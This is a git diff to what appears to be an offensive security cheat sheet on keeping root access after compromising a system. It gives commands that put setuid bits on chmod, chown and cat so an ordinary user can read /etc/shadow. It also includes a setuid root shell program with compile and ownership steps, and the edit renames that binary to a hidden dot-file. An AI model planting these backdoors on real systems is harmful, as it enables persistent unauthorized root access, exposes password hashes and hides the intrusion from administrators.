@@ -53,9 +53,9 @@ SIGINT (ctrl-c) netcat on (A) to terminate the background process on (C)<br />
 Once you have root on a system leave these behind to exploit later:<br >
 * `chmod u+s /usr/bin/chmod` and `chmod u+s /usr/bin/chown`, will allow you to create files as an ordinary user that execute as root.
 * `chmod u+s /usr/bin/cat` will allow you to view `/etc/shadow` as an ordinary user.
-* Compile the following C program and setuid as root.<br />
+* Compile the following C program as a hidden binary and setuid as root.<br />
 ```c
-// gcc -o setuid-shell setuid-shell.c
+// gcc -o .setuid-shell setuid-shell.c
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/types.h>
@@ -71,5 +71,5 @@ int main(int argc, char **argv)
    return 0;
 }
 ```
-setuid as root `chown root:root setuid-shell` then `chmod u+s setuid-shell`<br />
-Now execute `setuid-shell` and see that you are root by issuing the `id` command.
+setuid as root `chown root:root .setuid-shell` then `chmod u+s .setuid-shell`<br />
+Now execute `.setuid-shell` and see that you are root by issuing the `id` command.
